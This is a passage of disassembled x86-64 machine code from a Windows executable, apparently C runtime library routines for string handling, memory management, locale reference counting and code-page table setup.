   1400078d4:	e8 13 fc ff ff       	call   0x1400074ec
   1400078d9:	48 83 c3 08          	add    $0x8,%rbx
   1400078dd:	48 3b de             	cmp    %rsi,%rbx
   1400078e0:	75 ef                	jne    0x1400078d1
   1400078e2:	48 8b cf             	mov    %rdi,%rcx
   1400078e5:	e8 02 fc ff ff       	call   0x1400074ec
   1400078ea:	33 c0                	xor    %eax,%eax
   1400078ec:	48 8b 8d b8 01 00 00 	mov    0x1b8(%rbp),%rcx
   1400078f3:	48 33 cc             	xor    %rsp,%rcx
   1400078f6:	e8 95 61 00 00       	call   0x14000da90
   1400078fb:	48 8b 9c 24 10 03 00 	mov    0x310(%rsp),%rbx
   140007902:	00 
   140007903:	48 81 c4 c0 02 00 00 	add    $0x2c0,%rsp
   14000790a:	41 5f                	pop    %r15
   14000790c:	41 5e                	pop    %r14
   14000790e:	41 5d                	pop    %r13
   140007910:	41 5c                	pop    %r12
   140007912:	5f                   	pop    %rdi
   140007913:	5e                   	pop    %rsi
   140007914:	5d                   	pop    %rbp
   140007915:	c3                   	ret
   140007916:	45 33 c9             	xor    %r9d,%r9d
   140007919:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000791e:	45 33 c0             	xor    %r8d,%r8d
   140007921:	33 d2                	xor    %edx,%edx
   140007923:	e8 f4 f8 ff ff       	call   0x14000721c
   140007928:	cc                   	int3
   140007929:	cc                   	int3
   14000792a:	cc                   	int3
   14000792b:	cc                   	int3
   14000792c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007931:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140007936:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000793b:	57                   	push   %rdi
   14000793c:	41 54                	push   %r12
   14000793e:	41 55                	push   %r13
   140007940:	41 56                	push   %r14
   140007942:	41 57                	push   %r15
   140007944:	48 83 ec 30          	sub    $0x30,%rsp
   140007948:	48 83 cd ff          	or     $0xffffffffffffffff,%rbp
   14000794c:	49 8b f9             	mov    %r9,%rdi
   14000794f:	33 f6                	xor    %esi,%esi
   140007951:	4d 8b f0             	mov    %r8,%r14
   140007954:	4c 8b ea             	mov    %rdx,%r13
   140007957:	4c 8b e1             	mov    %rcx,%r12
   14000795a:	48 ff c5             	inc    %rbp
   14000795d:	66 39 34 69          	cmp    %si,(%rcx,%rbp,2)
   140007961:	75 f7                	jne    0x14000795a
   140007963:	49 8b c6             	mov    %r14,%rax
   140007966:	48 ff c5             	inc    %rbp
   140007969:	48 f7 d0             	not    %rax
   14000796c:	48 3b e8             	cmp    %rax,%rbp
   14000796f:	76 22                	jbe    0x140007993
   140007971:	b8 0c 00 00 00       	mov    $0xc,%eax
   140007976:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   14000797b:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   140007980:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   140007985:	48 83 c4 30          	add    $0x30,%rsp
   140007989:	41 5f                	pop    %r15
   14000798b:	41 5e                	pop    %r14
   14000798d:	41 5d                	pop    %r13
   14000798f:	41 5c                	pop    %r12
   140007991:	5f                   	pop    %rdi
   140007992:	c3                   	ret
   140007993:	4d 8d 78 01          	lea    0x1(%r8),%r15
   140007997:	ba 02 00 00 00       	mov    $0x2,%edx
   14000799c:	4c 03 fd             	add    %rbp,%r15
   14000799f:	49 8b cf             	mov    %r15,%rcx
   1400079a2:	e8 cd fa ff ff       	call   0x140007474
   1400079a7:	48 8b d8             	mov    %rax,%rbx
   1400079aa:	4d 85 f6             	test   %r14,%r14
   1400079ad:	74 19                	je     0x1400079c8
   1400079af:	4d 8b ce             	mov    %r14,%r9
   1400079b2:	4d 8b c5             	mov    %r13,%r8
   1400079b5:	49 8b d7             	mov    %r15,%rdx
   1400079b8:	48 8b c8             	mov    %rax,%rcx
   1400079bb:	e8 0c f9 ff ff       	call   0x1400072cc
   1400079c0:	85 c0                	test   %eax,%eax
   1400079c2:	0f 85 d8 00 00 00    	jne    0x140007aa0
   1400079c8:	4d 2b fe             	sub    %r14,%r15
   1400079cb:	4a 8d 0c 73          	lea    (%rbx,%r14,2),%rcx
   1400079cf:	49 8b d7             	mov    %r15,%rdx
   1400079d2:	4c 8b cd             	mov    %rbp,%r9
   1400079d5:	4d 8b c4             	mov    %r12,%r8
   1400079d8:	e8 ef f8 ff ff       	call   0x1400072cc
   1400079dd:	85 c0                	test   %eax,%eax
   1400079df:	0f 85 bb 00 00 00    	jne    0x140007aa0
   1400079e5:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   1400079e9:	44 8d 78 08          	lea    0x8(%rax),%r15d
   1400079ed:	4c 8b 77 10          	mov    0x10(%rdi),%r14
   1400079f1:	49 3b ce             	cmp    %r14,%rcx
   1400079f4:	0f 85 9d 00 00 00    	jne    0x140007a97
   1400079fa:	48 39 37             	cmp    %rsi,(%rdi)
   1400079fd:	75 2b                	jne    0x140007a2a
   1400079ff:	41 8b d7             	mov    %r15d,%edx
   140007a02:	8d 48 04             	lea    0x4(%rax),%ecx
   140007a05:	e8 6a fa ff ff       	call   0x140007474
   140007a0a:	33 c9                	xor    %ecx,%ecx
   140007a0c:	48 89 07             	mov    %rax,(%rdi)
   140007a0f:	e8 d8 fa ff ff       	call   0x1400074ec
   140007a14:	48 8b 0f             	mov    (%rdi),%rcx
   140007a17:	48 85 c9             	test   %rcx,%rcx
   140007a1a:	74 42                	je     0x140007a5e
   140007a1c:	48 8d 41 20          	lea    0x20(%rcx),%rax
   140007a20:	48 89 4f 08          	mov    %rcx,0x8(%rdi)
   140007a24:	48 89 47 10          	mov    %rax,0x10(%rdi)
   140007a28:	eb 6d                	jmp    0x140007a97
   140007a2a:	4c 2b 37             	sub    (%rdi),%r14
   140007a2d:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140007a34:	ff ff 7f 
   140007a37:	49 c1 fe 03          	sar    $0x3,%r14
   140007a3b:	4c 3b f0             	cmp    %rax,%r14
   140007a3e:	77 1e                	ja     0x140007a5e
   140007a40:	48 8b 0f             	mov    (%rdi),%rcx
   140007a43:	4b 8d 2c 36          	lea    (%r14,%r14,1),%rbp
   140007a47:	48 8b d5             	mov    %rbp,%rdx
   140007a4a:	4d 8b c7             	mov    %r15,%r8
   140007a4d:	e8 12 22 00 00       	call   0x140009c64
   140007a52:	48 85 c0             	test   %rax,%rax
   140007a55:	75 22                	jne    0x140007a79
   140007a57:	33 c9                	xor    %ecx,%ecx
   140007a59:	e8 8e fa ff ff       	call   0x1400074ec
   140007a5e:	48 8b cb             	mov    %rbx,%rcx
   140007a61:	e8 86 fa ff ff       	call   0x1400074ec
   140007a66:	be 0c 00 00 00       	mov    $0xc,%esi
   140007a6b:	33 c9                	xor    %ecx,%ecx
   140007a6d:	e8 7a fa ff ff       	call   0x1400074ec
   140007a72:	8b c6                	mov    %esi,%eax
   140007a74:	e9 fd fe ff ff       	jmp    0x140007976
   140007a79:	4a 8d 0c f0          	lea    (%rax,%r14,8),%rcx
   140007a7d:	48 89 07             	mov    %rax,(%rdi)
   140007a80:	48 89 4f 08          	mov    %rcx,0x8(%rdi)
   140007a84:	48 8d 0c e8          	lea    (%rax,%rbp,8),%rcx
   140007a88:	48 89 4f 10          	mov    %rcx,0x10(%rdi)
   140007a8c:	33 c9                	xor    %ecx,%ecx
   140007a8e:	e8 59 fa ff ff       	call   0x1400074ec
   140007a93:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   140007a97:	48 89 19             	mov    %rbx,(%rcx)
   140007a9a:	4c 01 7f 08          	add    %r15,0x8(%rdi)
   140007a9e:	eb cb                	jmp    0x140007a6b
   140007aa0:	45 33 c9             	xor    %r9d,%r9d
   140007aa3:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140007aa8:	45 33 c0             	xor    %r8d,%r8d
   140007aab:	33 d2                	xor    %edx,%edx
   140007aad:	33 c9                	xor    %ecx,%ecx
   140007aaf:	e8 68 f7 ff ff       	call   0x14000721c
   140007ab4:	cc                   	int3
   140007ab5:	cc                   	int3
   140007ab6:	cc                   	int3
   140007ab7:	cc                   	int3
   140007ab8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007abd:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140007ac2:	57                   	push   %rdi
   140007ac3:	48 83 ec 20          	sub    $0x20,%rsp
   140007ac7:	c6 41 18 00          	movb   $0x0,0x18(%rcx)
   140007acb:	48 8b f9             	mov    %rcx,%rdi
   140007ace:	48 8d 71 08          	lea    0x8(%rcx),%rsi
   140007ad2:	48 85 d2             	test   %rdx,%rdx
   140007ad5:	74 05                	je     0x140007adc
   140007ad7:	0f 10 02             	movups (%rdx),%xmm0
   140007ada:	eb 10                	jmp    0x140007aec
   140007adc:	83 3d 21 24 01 00 00 	cmpl   $0x0,0x12421(%rip)        # 0x140019f04
   140007ae3:	75 0d                	jne    0x140007af2
   140007ae5:	0f 10 05 6c 1c 01 00 	movups 0x11c6c(%rip),%xmm0        # 0x140019758
   140007aec:	f3 0f 7f 06          	movdqu %xmm0,(%rsi)
   140007af0:	eb 4e                	jmp    0x140007b40
   140007af2:	e8 1d f0 ff ff       	call   0x140006b14
   140007af7:	48 89 07             	mov    %rax,(%rdi)
   140007afa:	48 8b d6             	mov    %rsi,%rdx
   140007afd:	48 8b 88 90 00 00 00 	mov    0x90(%rax),%rcx
   140007b04:	48 89 0e             	mov    %rcx,(%rsi)
   140007b07:	48 8b 88 88 00 00 00 	mov    0x88(%rax),%rcx
   140007b0e:	48 89 4f 10          	mov    %rcx,0x10(%rdi)
   140007b12:	48 8b c8             	mov    %rax,%rcx
   140007b15:	e8 4e 2b 00 00       	call   0x14000a668
   140007b1a:	48 8b 0f             	mov    (%rdi),%rcx
   140007b1d:	48 8d 57 10          	lea    0x10(%rdi),%rdx
   140007b21:	e8 ae 2b 00 00       	call   0x14000a6d4
   140007b26:	48 8b 0f             	mov    (%rdi),%rcx
   140007b29:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   140007b2f:	a8 02                	test   $0x2,%al
   140007b31:	75 0d                	jne    0x140007b40
   140007b33:	83 c8 02             	or     $0x2,%eax
   140007b36:	89 81 a8 03 00 00    	mov    %eax,0x3a8(%rcx)
   140007b3c:	c6 47 18 01          	movb   $0x1,0x18(%rdi)
   140007b40:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007b45:	48 8b c7             	mov    %rdi,%rax
   140007b48:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140007b4d:	48 83 c4 20          	add    $0x20,%rsp
   140007b51:	5f                   	pop    %rdi
   140007b52:	c3                   	ret
   140007b53:	cc                   	int3
   140007b54:	e9 e3 f9 ff ff       	jmp    0x14000753c
   140007b59:	cc                   	int3
   140007b5a:	cc                   	int3
   140007b5b:	cc                   	int3
   140007b5c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007b61:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140007b66:	57                   	push   %rdi
   140007b67:	48 83 ec 40          	sub    $0x40,%rsp
   140007b6b:	49 8b f9             	mov    %r9,%rdi
   140007b6e:	49 8b d8             	mov    %r8,%rbx
   140007b71:	8b 0a                	mov    (%rdx),%ecx
   140007b73:	e8 30 0d 00 00       	call   0x1400088a8
   140007b78:	90                   	nop
   140007b79:	48 8b 03             	mov    (%rbx),%rax
   140007b7c:	48 8b 08             	mov    (%rax),%rcx
   140007b7f:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   140007b86:	48 83 c0 18          	add    $0x18,%rax
   140007b8a:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140007b8f:	48 8b 0d b2 23 01 00 	mov    0x123b2(%rip),%rcx        # 0x140019f48
   140007b96:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140007b9b:	48 85 c9             	test   %rcx,%rcx
   140007b9e:	74 6f                	je     0x140007c0f
   140007ba0:	48 85 c0             	test   %rax,%rax
   140007ba3:	74 5d                	je     0x140007c02
   140007ba5:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140007bab:	45 8b c8             	mov    %r8d,%r9d
   140007bae:	41 8d 50 7e          	lea    0x7e(%r8),%edx
   140007bb2:	0f 10 00             	movups (%rax),%xmm0
   140007bb5:	0f 11 01             	movups %xmm0,(%rcx)
   140007bb8:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140007bbc:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   140007bc0:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   140007bc4:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   140007bc8:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   140007bcc:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   140007bd0:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   140007bd4:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   140007bd8:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   140007bdc:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   140007be0:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   140007be4:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   140007be8:	48 03 ca             	add    %rdx,%rcx
   140007beb:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   140007bef:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   140007bf3:	48 03 c2             	add    %rdx,%rax
   140007bf6:	49 83 e9 01          	sub    $0x1,%r9
   140007bfa:	75 b6                	jne    0x140007bb2
   140007bfc:	8a 00                	mov    (%rax),%al
   140007bfe:	88 01                	mov    %al,(%rcx)
   140007c00:	eb 27                	jmp    0x140007c29
   140007c02:	33 d2                	xor    %edx,%edx
   140007c04:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   140007c0a:	e8 e1 61 00 00       	call   0x14000ddf0
   140007c0f:	e8 40 f8 ff ff       	call   0x140007454
   140007c14:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140007c1a:	e8 dd f5 ff ff       	call   0x1400071fc
   140007c1f:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140007c25:	41 8d 50 7e          	lea    0x7e(%r8),%edx
   140007c29:	48 8b 03             	mov    (%rbx),%rax
   140007c2c:	48 8b 08             	mov    (%rax),%rcx
   140007c2f:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   140007c36:	48 05 19 01 00 00    	add    $0x119,%rax
   140007c3c:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140007c41:	48 8b 0d 08 23 01 00 	mov    0x12308(%rip),%rcx        # 0x140019f50
   140007c48:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140007c4d:	48 85 c9             	test   %rcx,%rcx
   140007c50:	74 5e                	je     0x140007cb0
   140007c52:	48 85 c0             	test   %rax,%rax
   140007c55:	74 4c                	je     0x140007ca3
   140007c57:	0f 10 00             	movups (%rax),%xmm0
   140007c5a:	0f 11 01             	movups %xmm0,(%rcx)
   140007c5d:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140007c61:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   140007c65:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   140007c69:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   140007c6d:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   140007c71:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   140007c75:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   140007c79:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   140007c7d:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   140007c81:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   140007c85:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   140007c89:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   140007c8d:	48 03 ca             	add    %rdx,%rcx
   140007c90:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   140007c94:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   140007c98:	48 03 c2             	add    %rdx,%rax
   140007c9b:	49 83 e8 01          	sub    $0x1,%r8
   140007c9f:	75 b6                	jne    0x140007c57
   140007ca1:	eb 1d                	jmp    0x140007cc0
   140007ca3:	33 d2                	xor    %edx,%edx
   140007ca5:	41 b8 00 01 00 00    	mov    $0x100,%r8d
   140007cab:	e8 40 61 00 00       	call   0x14000ddf0
   140007cb0:	e8 9f f7 ff ff       	call   0x140007454
   140007cb5:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140007cbb:	e8 3c f5 ff ff       	call   0x1400071fc
   140007cc0:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140007cc4:	48 8b 08             	mov    (%rax),%rcx
   140007cc7:	48 8b 11             	mov    (%rcx),%rdx
   140007cca:	83 c8 ff             	or     $0xffffffff,%eax
   140007ccd:	f0 0f c1 02          	lock xadd %eax,(%rdx)
   140007cd1:	83 f8 01             	cmp    $0x1,%eax
   140007cd4:	75 1b                	jne    0x140007cf1
   140007cd6:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140007cda:	48 8b 08             	mov    (%rax),%rcx
   140007cdd:	48 8d 05 dc 13 01 00 	lea    0x113dc(%rip),%rax        # 0x1400190c0
   140007ce4:	48 39 01             	cmp    %rax,(%rcx)
   140007ce7:	74 08                	je     0x140007cf1
   140007ce9:	48 8b 09             	mov    (%rcx),%rcx
   140007cec:	e8 fb f7 ff ff       	call   0x1400074ec
   140007cf1:	48 8b 03             	mov    (%rbx),%rax
   140007cf4:	48 8b 10             	mov    (%rax),%rdx
   140007cf7:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140007cfb:	48 8b 08             	mov    (%rax),%rcx
   140007cfe:	48 8b 82 88 00 00 00 	mov    0x88(%rdx),%rax
   140007d05:	48 89 01             	mov    %rax,(%rcx)
   140007d08:	48 8b 03             	mov    (%rbx),%rax
   140007d0b:	48 8b 08             	mov    (%rax),%rcx
   140007d0e:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   140007d15:	f0 ff 00             	lock incl (%rax)
   140007d18:	8b 0f                	mov    (%rdi),%ecx
   140007d1a:	e8 dd 0b 00 00       	call   0x1400088fc
   140007d1f:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140007d24:	48 83 c4 40          	add    $0x40,%rsp
   140007d28:	5f                   	pop    %rdi
   140007d29:	c3                   	ret
   140007d2a:	cc                   	int3
   140007d2b:	cc                   	int3
   140007d2c:	40 53                	rex push %rbx
   140007d2e:	48 83 ec 40          	sub    $0x40,%rsp
   140007d32:	8b d9                	mov    %ecx,%ebx
   140007d34:	33 d2                	xor    %edx,%edx
   140007d36:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140007d3b:	e8 78 fd ff ff       	call   0x140007ab8
   140007d40:	83 25 19 22 01 00 00 	andl   $0x0,0x12219(%rip)        # 0x140019f60
   140007d47:	83 fb fe             	cmp    $0xfffffffe,%ebx
   140007d4a:	75 12                	jne    0x140007d5e
   140007d4c:	c7 05 0a 22 01 00 01 	movl   $0x1,0x1220a(%rip)        # 0x140019f60
   140007d53:	00 00 00 
   140007d56:	ff 15 1c 74 00 00    	call   *0x741c(%rip)        # 0x14000f178
   140007d5c:	eb 15                	jmp    0x140007d73
   140007d5e:	83 fb fd             	cmp    $0xfffffffd,%ebx
   140007d61:	75 14                	jne    0x140007d77
   140007d63:	c7 05 f3 21 01 00 01 	movl   $0x1,0x121f3(%rip)        # 0x140019f60
   140007d6a:	00 00 00 
   140007d6d:	ff 15 fd 73 00 00    	call   *0x73fd(%rip)        # 0x14000f170
   140007d73:	8b d8                	mov    %eax,%ebx
   140007d75:	eb 17                	jmp    0x140007d8e
   140007d77:	83 fb fc             	cmp    $0xfffffffc,%ebx
   140007d7a:	75 12                	jne    0x140007d8e
   140007d7c:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140007d81:	c7 05 d5 21 01 00 01 	movl   $0x1,0x121d5(%rip)        # 0x140019f60
   140007d88:	00 00 00 
   140007d8b:	8b 58 0c             	mov    0xc(%rax),%ebx
   140007d8e:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   140007d93:	74 0c                	je     0x140007da1
   140007d95:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140007d9a:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   140007da1:	8b c3                	mov    %ebx,%eax
   140007da3:	48 83 c4 40          	add    $0x40,%rsp
   140007da7:	5b                   	pop    %rbx
   140007da8:	c3                   	ret
   140007da9:	cc                   	int3
   140007daa:	cc                   	int3
   140007dab:	cc                   	int3
   140007dac:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007db1:	57                   	push   %rdi
   140007db2:	48 83 ec 20          	sub    $0x20,%rsp
   140007db6:	48 8b d9             	mov    %rcx,%rbx
   140007db9:	33 d2                	xor    %edx,%edx
   140007dbb:	48 83 c1 18          	add    $0x18,%rcx
   140007dbf:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   140007dc5:	e8 26 60 00 00       	call   0x14000ddf0
   140007dca:	33 d2                	xor    %edx,%edx
   140007dcc:	48 8d 7b 0c          	lea    0xc(%rbx),%rdi
   140007dd0:	0f b7 c2             	movzwl %dx,%eax
   140007dd3:	4c 8d 0d e6 12 01 00 	lea    0x112e6(%rip),%r9        # 0x1400190c0
   140007dda:	48 89 53 04          	mov    %rdx,0x4(%rbx)
   140007dde:	4c 8b c3             	mov    %rbx,%r8
   140007de1:	48 89 93 20 02 00 00 	mov    %rdx,0x220(%rbx)
   140007de8:	8d 4a 06             	lea    0x6(%rdx),%ecx
   140007deb:	66 f3 ab             	rep stos %ax,(%rdi)
   140007dee:	48 8d 05 e3 12 01 00 	lea    0x112e3(%rip),%rax        # 0x1400190d8
   140007df5:	8b fa                	mov    %edx,%edi
   140007df7:	4c 2b c0             	sub    %rax,%r8
   140007dfa:	4a 8d 0c 0f          	lea    (%rdi,%r9,1),%rcx
   140007dfe:	48 ff c7             	inc    %rdi
   140007e01:	8a 41 18             	mov    0x18(%rcx),%al
   140007e04:	41 88 44 08 30       	mov    %al,0x30(%r8,%rcx,1)
   140007e09:	48 81 ff 01 01 00 00 	cmp    $0x101,%rdi
   140007e10:	7c e8                	jl     0x140007dfa
   140007e12:	48 8d 05 c0 13 01 00 	lea    0x113c0(%rip),%rax        # 0x1400191d9
   140007e19:	48 2b d8             	sub    %rax,%rbx
   140007e1c:	4a 8d 0c 0a          	lea    (%rdx,%r9,1),%rcx
   140007e20:	48 ff c2             	inc    %rdx
   140007e23:	8a 81 19 01 00 00    	mov    0x119(%rcx),%al
   140007e29:	88 84 0b 32 02 00 00 	mov    %al,0x232(%rbx,%rcx,1)
   140007e30:	48 81 fa 00 01 00 00 	cmp    $0x100,%rdx
   140007e37:	7c e3                	jl     0x140007e1c
   140007e39:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007e3e:	48 83 c4 20          	add    $0x20,%rsp
   140007e42:	5f                   	pop    %rdi
   140007e43:	c3                   	ret
   140007e44:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140007e49:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140007e4e:	55                   	push   %rbp
   140007e4f:	48 8d ac 24 80 f9 ff 	lea    -0x680(%rsp),%rbp
   140007e56:	ff 
   140007e57:	48 81 ec 80 07 00 00 	sub    $0x780,%rsp
   140007e5e:	48 8b 05 db 11 01 00 	mov    0x111db(%rip),%rax        # 0x140019040
   140007e65:	48 33 c4             	xor    %rsp,%rax
   140007e68:	48 89 85 70 06 00 00 	mov    %rax,0x670(%rbp)
   140007e6f:	48 8b f9             	mov    %rcx,%rdi
   140007e72:	8b 49 04             	mov    0x4(%rcx),%ecx
   140007e75:	81 f9 e9 fd 00 00    	cmp    $0xfde9,%ecx
   140007e7b:	0f 84 47 01 00 00    	je     0x140007fc8
   140007e81:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140007e86:	ff 15 f4 72 00 00    	call   *0x72f4(%rip)        # 0x14000f180
   140007e8c:	85 c0                	test   %eax,%eax
   140007e8e:	0f 84 34 01 00 00    	je     0x140007fc8
   140007e94:	33 c0                	xor    %eax,%eax
   140007e96:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140007e9b:	bb 00 01 00 00       	mov    $0x100,%ebx
   140007ea0:	88 01                	mov    %al,(%rcx)
   140007ea2:	ff c0                	inc    %eax
   140007ea4:	48 ff c1             	inc    %rcx
   140007ea7:	3b c3                	cmp    %ebx,%eax
   140007ea9:	72 f5                	jb     0x140007ea0
   140007eab:	8a 44 24 56          	mov    0x56(%rsp),%al
   140007eaf:	48 8d 54 24 56       	lea    0x56(%rsp),%rdx
   140007eb4:	c6 44 24 70 20       	movb   $0x20,0x70(%rsp)
   140007eb9:	eb 20                	jmp    0x140007edb
   140007ebb:	44 0f b6 42 01       	movzbl 0x1(%rdx),%r8d
   140007ec0:	0f b6 c8             	movzbl %al,%ecx
   140007ec3:	eb 0b                	jmp    0x140007ed0
   140007ec5:	3b cb                	cmp    %ebx,%ecx
   140007ec7:	73 0c                	jae    0x140007ed5
   140007ec9:	c6 44 0c 70 20       	movb   $0x20,0x70(%rsp,%rcx,1)
   140007ece:	ff c1                	inc    %ecx
   140007ed0:	41 3b c8             	cmp    %r8d,%ecx
   140007ed3:	76 f0                	jbe    0x140007ec5
   140007ed5:	48 83 c2 02          	add    $0x2,%rdx
   140007ed9:	8a 02                	mov    (%rdx),%al
   140007edb:	84 c0                	test   %al,%al
   140007edd:	75 dc                	jne    0x140007ebb
   140007edf:	8b 47 04             	mov    0x4(%rdi),%eax
   140007ee2:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   140007ee7:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   140007eec:	44 8b cb             	mov    %ebx,%r9d
   140007eef:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140007ef3:	ba 01 00 00 00       	mov    $0x1,%edx
   140007ef8:	48 8d 85 70 02 00 00 	lea    0x270(%rbp),%rax
   140007eff:	33 c9                	xor    %ecx,%ecx
   140007f01:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140007f06:	e8 45 13 00 00       	call   0x140009250
   140007f0b:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   140007f10:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   140007f15:	8b 47 04             	mov    0x4(%rdi),%eax
   140007f18:	44 8b c3             	mov    %ebx,%r8d
   140007f1b:	48 8b 97 20 02 00 00 	mov    0x220(%rdi),%rdx
   140007f22:	33 c9                	xor    %ecx,%ecx
   140007f24:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140007f28:	48 8d 45 70          	lea    0x70(%rbp),%rax
   140007f2c:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   140007f30:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140007f35:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   140007f39:	e8 d2 30 00 00       	call   0x14000b010
   140007f3e:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   140007f43:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   140007f48:	8b 47 04             	mov    0x4(%rdi),%eax
   140007f4b:	41 b8 00 02 00 00    	mov    $0x200,%r8d
   140007f51:	48 8b 97 20 02 00 00 	mov    0x220(%rdi),%rdx
   140007f58:	33 c9                	xor    %ecx,%ecx
   140007f5a:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140007f5e:	48 8d 85 70 01 00 00 	lea    0x170(%rbp),%rax
   140007f65:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   140007f69:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140007f6e:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   140007f72:	e8 99 30 00 00       	call   0x14000b010
   140007f77:	4c 8d 45 70          	lea    0x70(%rbp),%r8
   140007f7b:	4c 2b c7             	sub    %rdi,%r8
   140007f7e:	4c 8d 8d 70 01 00 00 	lea    0x170(%rbp),%r9
   140007f85:	4c 2b cf             	sub    %rdi,%r9
   140007f88:	48 8d 95 70 02 00 00 	lea    0x270(%rbp),%rdx
   140007f8f:	48 8d 47 19          	lea    0x19(%rdi),%rax
   140007f93:	f6 02 01             	testb  $0x1,(%rdx)
   140007f96:	74 0a                	je     0x140007fa2
   140007f98:	80 08 10             	orb    $0x10,(%rax)
   140007f9b:	41 8a 4c 00 e7       	mov    -0x19(%r8,%rax,1),%cl
   140007fa0:	eb 11                	jmp    0x140007fb3
   140007fa2:	f6 02 02             	testb  $0x2,(%rdx)
   140007fa5:	74 0a                	je     0x140007fb1
   140007fa7:	80 08 20             	orb    $0x20,(%rax)
   140007faa:	41 8a 4c 01 e7       	mov    -0x19(%r9,%rax,1),%cl
   140007faf:	eb 02                	jmp    0x140007fb3
   140007fb1:	32 c9                	xor    %cl,%cl
   140007fb3:	88 88 00 01 00 00    	mov    %cl,0x100(%rax)
   140007fb9:	48 83 c2 02          	add    $0x2,%rdx
   140007fbd:	48 ff c0             	inc    %rax
   140007fc0:	48 83 eb 01          	sub    $0x1,%rbx
   140007fc4:	75 cd                	jne    0x140007f93
   140007fc6:	eb 3f                	jmp    0x140008007
   140007fc8:	33 d2                	xor    %edx,%edx
   140007fca:	48 8d 4f 19          	lea    0x19(%rdi),%rcx
   140007fce:	bb 00 01 00 00       	mov    $0x100,%ebx
   140007fd3:	44 8d 42 9f          	lea    -0x61(%rdx),%r8d
   140007fd7:	41 8d 40 20          	lea    0x20(%r8),%eax
